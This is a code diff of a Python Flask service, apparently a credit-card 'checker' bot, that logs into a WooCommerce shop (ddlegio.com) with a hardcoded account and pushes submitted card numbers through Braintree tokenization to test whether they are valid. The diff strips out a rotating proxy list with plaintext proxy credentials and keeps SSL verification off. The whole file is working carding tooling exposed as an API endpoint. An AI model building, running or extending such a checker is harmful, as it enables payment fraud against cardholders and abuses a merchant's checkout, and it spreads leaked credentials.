@@ -13,37 +13,16 @@ import urllib3
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- Proxy Configuration ---
-raw_proxies_list = [
-    "142.111.48.253:7030:nicubbvn:cjrkvyokt7p9",
-    "23.95.150.145:6114:nicubbvn:cjrkvyokt7p9",
-    "198.23.239.134:6540:nicubbvn:cjrkvyokt7p9",
-    "107.172.163.27:6543:nicubbvn:cjrkvyokt7p9",
-    "198.105.121.200:6462:nicubbvn:cjrkvyokt7p9",
-    "64.137.96.74:6641:nicubbvn:cjrkvyokt7p9",
-    "84.247.60.125:6095:nicubbvn:cjrkvyokt7p9",
-    "216.10.27.159:6837:nicubbvn:cjrkvyokt7p9",
-    "23.26.71.145:5628:nicubbvn:cjrkvyokt7p9",
-    "23.27.208.120:5830:nicubbvn:cjrkvyokt7p9"
-]
-
-# Select a random proxy
-selected_proxy = random.choice(raw_proxies_list)
-ip, port, user, password = selected_proxy.split(':')
-proxy_url = f"http://{user}:{password}@{ip}:{port}"
-
-proxies = {
-    'http': proxy_url,
-    'https': proxy_url  # Added HTTPS proxy support
-}
-# -------------------------------
+# --- Proxy Configuration REMOVED ---
+proxies = None 
+# ------------------------------------
 
 app = Flask(__name__)
 
 class BraintreeLoginChecker:
     def __init__(self, proxies=None):
         self.session = requests.Session()
-        self.proxies = proxies
+        self.proxies = proxies # Will be None
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         }
@@ -52,33 +31,33 @@ class BraintreeLoginChecker:
     def login(self, domain, username, password):
         login_url = f"{domain}/my-account/"
         
-        # Step 1: Visit Homepage to establish cookies (Fix for login loops)
+        # Step 1: Visit Homepage to establish cookies
         try:
-            self.session.get(domain, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
+            # Proxies=None means direct connection
+            self.session.get(domain, headers=self.headers, proxies=self.proxies, verify=False, timeout=15)
         except Exception as e:
             return False, f"Connection Error: {str(e)}"
 
         # Step 2: Get Login Page
-        response = self.session.get(login_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
+        response = self.session.get(login_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=15)
         
         if response.status_code != 200:
             return False, f"Failed to get login page (Status: {response.status_code})"
         
         soup = BeautifulSoup(response.text, 'html.parser')
         
-        # Step 3: Extract Nonce with Fallbacks
+        # Step 3: Extract Nonce
         nonce_input = soup.find("input", {"name": "woocommerce-login-nonce"})
         if not nonce_input:
             match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', response.text)
             if match:
                 login_nonce = match.group(1)
             else:
-                # Try finding generic _wpnonce if specific one missing
                 nonce_input = soup.find("input", {"name": "_wpnonce"})
                 if nonce_input:
                     login_nonce = nonce_input.get("value")
                 else:
-                    return False, "Login nonce not found (Site structure might have changed)"
+                    return False, "Login nonce not found"
         else:
             login_nonce = nonce_input.get("value")
         
@@ -88,7 +67,7 @@ class BraintreeLoginChecker:
             'rememberme': 'forever',
             'woocommerce-login-nonce': login_nonce,
             '_wp_http_referer': '/my-account/',
-            'redirect_to': domain + '/my-account/', # Required by some WP configs
+            'redirect_to': domain + '/my-account/',
             'login': 'Log in',
         }
         
@@ -100,13 +79,12 @@ class BraintreeLoginChecker:
         })
         
         # Step 4: Perform Login
-        login_response = self.session.post(login_url, headers=login_headers, data=login_data, proxies=self.proxies, verify=False, timeout=10)
+        login_response = self.session.post(login_url, headers=login_headers, data=login_data, proxies=self.proxies, verify=False, timeout=15)
         
-        # Step 5: Check for Success or Parse Error
+        # Step 5: Check Response
         if "Log out" in login_response.text or "woocommerce-MyAccount-navigation" in login_response.text:
             return True, self.session
         else:
-            # Parse specific error message
             soup_resp = BeautifulSoup(login_response.text, 'html.parser')
             error_container = soup_resp.find('div', class_='woocommerce-error')
             if not error_container:
@@ -116,9 +94,8 @@ class BraintreeLoginChecker:
                 error_msg = error_container.get_text(strip=True)
                 return False, f"Site Error: {error_msg}"
             
-            # Fallback if no error message found but login failed
             if "login" in login_response.url:
-                 return False, "Login Failed: Redirected back to login (Check credentials/proxy)"
+                 return False, "Login Failed: Redirected back to login (Check credentials)"
                  
             return False, "Login failed: Unknown response"
     
@@ -128,7 +105,7 @@ class BraintreeLoginChecker:
         headers = self.headers.copy()
         headers['Referer'] = f"{domain}/my-account/"
         
-        response = self.session.get(payment_url, headers=headers, proxies=self.proxies, verify=False, timeout=10)
+        response = self.session.get(payment_url, headers=headers, proxies=self.proxies, verify=False, timeout=15)
         
         if response.status_code != 200:
             return None, None, "Failed to get payment page"
@@ -145,7 +122,6 @@ class BraintreeLoginChecker:
         if use_known_token:
             auth_token = self.known_auth_token
         else:
-            # Logic to extract dynamic token if needed
             jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
             matches = re.findall(jwt_pattern, response.text)
             if matches:
@@ -194,7 +170,7 @@ class BraintreeLoginChecker:
                 'https://payments.braintree-api.com/graphql',
                 headers=token_headers,
                 json=json_data,
-                proxies=self.proxies,
+                proxies=self.proxies, # None
                 verify=False,
                 timeout=15
             )
@@ -203,8 +179,7 @@ class BraintreeLoginChecker:
                 token_data = response.json()
                 if 'data' in token_data and 'tokenizeCreditCard' in token_data['data']:
                     return token_data['data']['tokenizeCreditCard']['token']
-        except Exception as e:
-            print(f"Tokenization error: {e}")
+        except Exception:
             return None
         return None
     
@@ -236,7 +211,7 @@ class BraintreeLoginChecker:
         return response
 
 def check_card(cc_line):
-    """Check a single credit card using the new BraintreeLoginChecker class"""
+    """Check a single credit card"""
     start_time = time.time()
     
     domain = "https://ddlegio.com"
@@ -244,6 +219,7 @@ def check_card(cc_line):
     password = "Xcracker@911"
     
     try:
+        # Passing proxies=None
         checker = BraintreeLoginChecker(proxies=proxies)
         
         # 1. Login
@@ -321,7 +297,7 @@ def check_card(cc_line):
 
 Card: {n}|{mm}|{yy}|{cvc}
 Response: {response_msg}
-Gateway: Braintree Auth (New Logic)
+Gateway: Braintree Auth
 Time: {elapsed_time:.1f}s
 Bot By: @FailureFr
 =========================
@@ -351,11 +327,11 @@ def check_credit_card(card):
 @app.route('/')
 def index():
     return """
-    <h1>B3 Auth API (Fixed Logic)</h1>
+    <h1>B3 Auth API (No Proxy)</h1>
     <p>Use the endpoint: /gate=b3/cc={card}</p>
     <p>Format: CC_NUMBER|MM|YY|CVC</p>
     <p>Example: /gate=b3/cc=4111111111111111|12|25|123</p>
-    <p>Target: ddlegio.com (via Login Method)</p>
+    <p>Target: ddlegio.com</p>
     """
 
 if __name__ == '__main__':
